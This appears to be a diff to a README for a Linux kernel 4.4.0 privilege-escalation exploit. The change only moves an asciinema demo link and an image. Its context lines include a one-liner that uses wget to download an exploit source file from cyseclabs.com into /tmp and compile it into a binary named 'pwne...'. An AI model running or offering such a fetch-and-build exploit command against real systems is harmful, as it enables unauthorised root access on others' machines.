@@ -10,7 +10,8 @@ apt update
 apt install linux-image-4.4.0-117-generic
 
 ```
-![](./0day.jpg)
+
+[![asciicast](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW.png)](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW)
 
 
 ### Use-Aget:
@@ -19,5 +20,4 @@ wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwne
 
 ```
 
-
-[![asciicast](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW.png)](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW)
+![](./0day.jpg)
